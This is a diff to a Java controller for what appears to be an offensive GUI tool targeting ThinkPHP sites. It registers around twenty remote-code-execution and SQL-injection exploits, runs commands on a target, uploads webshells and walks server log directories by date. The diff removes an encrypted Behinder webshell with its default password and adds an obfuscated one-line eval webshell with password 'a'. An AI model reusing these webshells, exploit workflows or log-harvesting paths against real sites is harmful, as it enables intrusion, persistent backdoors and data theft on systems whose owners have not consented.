@@ -1,14 +1,14 @@
 package fun.fireline.controller;
 
-import fun.fireline.core.Constants;
-import fun.fireline.core.ExploitInterface;
-import fun.fireline.core.Job;
+import com.jfoenix.controls.JFXButton;
+import com.jfoenix.controls.JFXComboBox;
+import fun.fireline.core.*;
 import fun.fireline.tools.Tools;
 import javafx.fxml.FXML;
-import javafx.scene.control.ChoiceBox;
-import javafx.scene.control.TextArea;
-import javafx.scene.control.TextField;
+import javafx.scene.control.*;
 
+import java.time.LocalDate;
+import java.time.chrono.ChronoLocalDate;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
@@ -43,6 +43,19 @@ public class ThinkPHPController extends MainController{
     private TextArea upload_msg;
     @FXML
     private TextField url;
+    @FXML
+    private JFXComboBox<String> logPath;
+
+    @FXML
+    private JFXButton log_clear;
+
+    @FXML
+    private DatePicker start_time;
+    @FXML
+    private DatePicker stop_time;
+
+    @FXML
+    private TextArea loginfo;
 
     private ExploitInterface ei;
 
@@ -50,41 +63,45 @@ public class ThinkPHPController extends MainController{
 
             "支持检测: \r\n" +
             "\tThinkPHP 2.x : \tThinkPHP 2.x 任意代码执行漏洞   https://vulhub.org/#/environments/thinkphp/2-rce/ \r\n" +
-            "\t未完待续 \r\n\r\n\r\n" +
+            "\tTP5_construct_code_exec_1 \t TP5_construct_code_exec_2 \t TP5_construct_code_exec_3 \t TP5_construct_code_exec_4 \r\n" +
+            "\tTP5_construct_debug_rce \t TP5_driver_display_rce \t TP5_invoke_func_code_exec_1 \t TP5_invoke_func_code_exec_2 \r\n" +
+            "\tTP5_method_filter_code_exec \tTP5_request_input_rce \tTP5_templalte_driver_rce \tTP6_session_file_write \r\n" +
+            "\tTP_cache \tTP5_index_showid_rce \tTP5_debug_index_ids_sqli \tTP_checkcode_time_sqli \r\n" +
+            "\tTP_multi_sql_leak \tTP_pay_orderid_sqli \tTP_update_sql tTP_view_recent_xff_sqli \r\n" +
+
+            "\r\n\t\t\tpayload均取自 https://github.com/bewhale/thinkphp_gui_tools\r\n" +
+            "\t\t\thttp 请求包也是取自蓝鲸师傅，特此感谢！\r\n" +
+            "\t\t\t蓝鲸师傅 yyds \r\n\r\n\r\n" +
 
             Constants.UPDATEINFO;
 
     public static String[] ThinkPHP = {
-            "ThinkPHP 2.x",
             "all",
+            "ThinkPHP 2.x",
+            "TP5_construct_code_exec_1",
+            "TP5_construct_code_exec_2",
+            "TP5_construct_code_exec_3",
+            "TP5_construct_code_exec_4",
+            "TP5_construct_debug_rce",
+            "TP5_driver_display_rce",
+            "TP5_index_construct_rce",
+            "TP5_invoke_func_code_exec_1",
+            "TP5_invoke_func_code_exec_2",
+            "TP5_method_filter_code_exec",
+            "TP5_request_input_rce",
+            "TP5_templalte_driver_rce",
+            "TP6_session_file_write",
+            "TP_cache",
+            "TP5_index_showid_rce",
+            "TP5_debug_index_ids_sqli",
+            "TP_checkcode_time_sqli",
+            "TP_multi_sql_leak",
+            "TP_pay_orderid_sqli",
+            "TP_update_sql",
+            "TP_view_recent_xff_sqli",
     };
 
-    public static String SHELL = "<?php\n" +
-            "@error_reporting(0);\n" +
-            "session_start();\n" +
-            "    $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n" +
-            "\t$_SESSION['k']=$key;\n" +
-            "\tsession_write_close();\n" +
-            "\t$post=file_get_contents(\"php://input\");\n" +
-            "\tif(!extension_loaded('openssl'))\n" +
-            "\t{\n" +
-            "\t\t$t=\"base64_\".\"decode\";\n" +
-            "\t\t$post=$t($post.\"\");\n" +
-            "\t\t\n" +
-            "\t\tfor($i=0;$i<strlen($post);$i++) {\n" +
-            "    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n" +
-            "    \t\t\t}\n" +
-            "\t}\n" +
-            "\telse\n" +
-            "\t{\n" +
-            "\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n" +
-            "\t}\n" +
-            "    $arr=explode('|',$post);\n" +
-            "    $func=$arr[0];\n" +
-            "    $params=$arr[1];\n" +
-            "\tclass C{public function __invoke($p) {eval($p.\"\");}}\n" +
-            "    @call_user_func(new C(),$params);\n" +
-            "?>\n";
+    public static String SHELL = "<?php $a=\"~+d()\"^\"!{+{}\";@$b=base64_decode(${$a}[\"a\"]);eval(\"\".$b);?>";
 
     // 界面显示  一些默认的基本信息，漏洞列表、编码选项、线程、shell、页脚
     public void defaultInformation() {
@@ -106,7 +123,8 @@ public class ThinkPHPController extends MainController{
         this.cmd_info.setText(" ");
         this.cmd_info.setWrapText(true);
 
-        this.upload_msg.setText("默认为冰蝎的shell, 密码：rebeyond");
+        this.upload_msg.setText("[+] 如需要自定义写入shell的路径，文件名处填写绝对路径即可(少数exp不支持)。\r\n" +
+                "[+] 默认shell使用蚁剑连接，密码为a，需要base64编码器。");
 
 
         this.platform.setValue("Linux");
@@ -117,6 +135,20 @@ public class ThinkPHPController extends MainController{
 
     // 基本信息
     public void basic() {
+        this.logPath.getItems().addAll("/runtime/log/",
+                "/Runtime/Logs/",
+                "/Runtime/Logs/Home/",
+                "/Runtime/Logs/Admin/",
+                "/App/Runtime/Logs/",
+                "/Application/Runtime/Logs/",
+                "/Application/Runtime/Logs/Home/",
+                "/Application/Runtime/Logs/Common/",
+                "/Application/Runtime/Logs/Admin/");
+
+        this.logPath.setValue("/runtime/log/");
+
+        this.logPath.setEditable(true);
+
         // 切换界面保留原来的记录
         // 基本信息的历史记录
         if(history.containsKey("ThinkPHP_url")) {
@@ -164,54 +196,43 @@ public class ThinkPHPController extends MainController{
     // 点击检测，获取url 和 要检测的漏洞
     @FXML
     public void check() {
-        String url = this.url.getText().trim();
+        String url = Tools.urlParse(this.url.getText().trim());
         history.put("ThinkPHP_url", this.url.getText());
         String vulName = this.choice_cve.getValue().toString().trim();
 
         history.put("ThinkPHP_vulName", this.choice_cve.getValue());
 
-        if(Tools.checkTheURL(url)) {
-            try {
-                if (vulName.equals("all")) {
-                    this.basic_info.setText("");
-                    ExecutorService pool = Executors.newFixedThreadPool(3);
-                    for (String vul : this.choice_cve.getItems()) {
-                        if (!vul.equals("all")) {
-                            Job t = new Job(url, vul);
-                            // 线程池
-                            Future f = pool.submit(t);
-                            try {
-                                if ((Boolean) f.get()) {
-                                    this.basic_info.setText(this.basic_info.getText() + "\r\n\t[ + ] " + url + " 存在 " + vul + " 漏洞  O(∩_∩)O~" + "\r\n");
-                                } else {
-                                    this.basic_info.setText(this.basic_info.getText() + "\r\n\t[ - ] " + url + " 不存在 " + vul + " 漏洞 \r\n");
-                                }
-                            } catch (Exception e1) {
-                                logger.error(e1.toString());
+        try {
+            if (vulName.equals("all")) {
+                this.basic_info.setText("[+] " + url + " 的检测结果如下：\n");
+                for (String vul : this.choice_cve.getItems()) {
+                    if (!vul.equals("all")) {
+                        VulCheckTask vulCheckTask = new VulCheckTask(this.url.getText(), vul);
+                        vulCheckTask.messageProperty().addListener((observable, oldValue, newValue) -> {
+                            this.basic_info.appendText("\t" + newValue + "\r\n\r\n");
+                            if(newValue.contains("目标存在")) {
+                                this.choice_cve.setValue(vul);
+                                this.ei = Tools.getExploit(vul);
+                                this.ei.checkVul(url);
                             }
-                        }
+                        });
+                        (new Thread(vulCheckTask)).start();
                     }
-                } else {
-                    this.ei = Tools.getExploit(vulName);
-
-                    if(this.ei.checkVul(url)) {
-                        this.basic_info.setText("\r\n\t[ + ] " + url + " 存在 " + vulName + " 漏洞" + "\r\n\r\n\twebPath:\r\n\t\t" + this.ei.getWebPath());
-                    } else {
-                        this.basic_info.setText("\r\n\t[ - ] " + url + " 不存在 " + vulName + " 漏洞 \r\n");
-                    }
-                    history.put("ThinkPHP_ei", this.ei);
                 }
-
-            } catch (Exception e) {
-                this.basic_info.setText("\r\n\t检测异常 \r\n\t\t\t" + e.toString());
+            } else {
+                this.ei = Tools.getExploit(vulName);
+                String result = this.ei.checkVul(url);
+                this.basic_info.setText("\r\n\t" + result + "\r\n\r\n\twebPath:\r\n\t\t" + this.ei.getWebPath());
             }
 
-
-        } else {
-            Tools.alert("URL检查", "URL格式不符合要求，示例：http://127.0.0.1:7001/");
+        } catch (Exception e) {
+            this.basic_info.setText("\r\n\t检测异常 \r\n\t\t\t" + e.toString());
         }
 
+        history.put("ThinkPHP_ei", this.ei);
         history.put("ThinkPHP_basic_info", this.basic_info.getText());
+
+        history.put("ThinkPHP_basic_info1", this.basic_info.getText());
 
     }
 
@@ -228,21 +249,18 @@ public class ThinkPHPController extends MainController{
             cmd = "whoami";
         }
 
-        if(this.ei.isVul()) {
-            try {
+        try {
+            if(this.ei.isVul()) {
                 String result = this.ei.exeCmd(cmd, encoding);
-                if(result.contains("fail")) {
-                    this.cmd_info.setText("命令执行失败");
-                } else {
-                    this.cmd_info.setText(result);
-                }
+                this.cmd_info.setText(result);
 
-            } catch (Exception var4) {
-                this.cmd_info.setText("error: " + var4.toString());
+            } else {
+                this.cmd_info.setText("请先进行漏洞检测，确认漏洞存在");
             }
 
-        } else {
-            this.cmd_info.setText("请先进行漏洞检测，确认漏洞存在");
+        } catch (Exception var4) {
+            this.cmd_info.setText("请先进行漏洞检测，确认漏洞存在\r\n");
+            this.cmd_info.appendText("error: " + var4.toString());
         }
         history.put("ThinkPHP_cmd_info", this.cmd_info.getText());
     }
@@ -275,7 +293,6 @@ public class ThinkPHPController extends MainController{
 
             } else {
                 this.upload_msg.setText("文件上传失败！");
-                System.out.println( this.ei.isVul());
             }
             history.put("ThinkPHP_upload_msg", this.upload_msg.getText());
         } else {
@@ -284,8 +301,31 @@ public class ThinkPHPController extends MainController{
 
     }
 
+    // 日志遍历
+    @FXML
+    public void log_traversal_start() {
+        this.logPath.getValue();
+        if (this.start_time.getValue() != null && this.stop_time.getValue() != null && this.logPath.getValue() != null && !((String)this.logPath.getValue()).equals("")) {
+            this.loginfo.appendText("开始遍历日志：\n");
+
+            for(LocalDate currentdate = (LocalDate)this.start_time.getValue(); currentdate.isBefore((ChronoLocalDate)this.stop_time.getValue()) || currentdate.equals(this.stop_time.getValue()); currentdate = currentdate.plusDays(1L)) {
+                WebLogTask webLogTask = new WebLogTask(Tools.urlParse(this.url.getText()), (String)this.logPath.getValue(), String.valueOf(currentdate.getYear()), String.valueOf(currentdate.getMonth().getValue()), String.valueOf(currentdate.getDayOfMonth()));
+                webLogTask.messageProperty().addListener((observable, oldValue, newValue) -> {
+                    this.loginfo.appendText(newValue + "\n");
+                });
+                (new Thread(webLogTask)).start();
+            }
+        } else {
+            Tools.alert("提示", "请输入路径和需要遍历的日期区间！");
+        }
+    }
+
+
     // 加载
     public void initialize() {
+        this.log_clear.setOnAction((event) ->{
+            this.loginfo.setText("");
+        });
         try {
             this.defaultInformation();
             this.basic();
